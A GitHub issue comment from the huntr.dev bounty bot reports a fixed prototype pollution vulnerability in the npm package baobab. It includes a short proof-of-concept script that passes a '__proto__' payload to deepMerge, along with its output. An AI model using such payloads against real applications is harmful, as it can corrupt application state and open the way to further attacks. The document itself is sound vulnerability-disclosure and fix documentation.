### @huntr-helper **[huntr-helper](/huntr-helper)** commented [Jan 26, 2021](#issue-794385097)

[@arjunshibu](https://github.com/arjunshibu) (<https://huntr.dev/users/arjunshibu>) has fixed a potential Prototype Pollution vulnerability in your repository üî®. For more information, visit our website (<https://huntr.dev/>) or click the bounty URL below...

Q | A

Version Affected | \*

Bug Fix | YES

Original Pull Request | [418sec#1](https://github.com/418sec/baobab/pull/1)

Vulnerability README | <https://github.com/418sec/huntr/blob/master/bounties/npm/baobab/1/README.md>

### User Comments:

### üìä Metadata \*

`baobab` is vulnerable to `Prototype Pollution`.

#### Bounty URL: <https://www.huntr.dev/bounties/1-npm-baobab>

### ‚öôÔ∏è Description \*

Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects.

JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values. Properties on the Object.prototype are then inherited by all the JavaScript objects through the prototype chain.

### üíª Technical Description \*

Fix implemented by not allowing to modify object prototype.

### üêõ Proof of Concept (PoC) \*

1. Create the following PoC file:

```
// poc.js
const Baobab = require('baobab');

console.log(`Before: ${{}.polluted}`)
tree = new Baobab()
tree.deepMerge(JSON.parse('{"__proto__": {"polluted": true}}'))
console.log(`After: ${{}.polluted}`)
```

2. Execute the following commands in terminal:

```
npm i baobab # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:

```
Before : undefined
After : true

```
### üî• Proof of Fix (PoF) \*

*I've added unit tests for Prototype Pollution*

[![image](https://user-images.githubusercontent.com/43996156/105388471-b4708c00-5c3c-11eb-86d4-959cf2422322.png)](https://user-images.githubusercontent.com/43996156/105388471-b4708c00-5c3c-11eb-86d4-959cf2422322.png)

### +1 User Acceptance Testing (UAT)

* I've executed unit tests.
* After fix the functionality is unaffected.

Sorry, something went wrong.
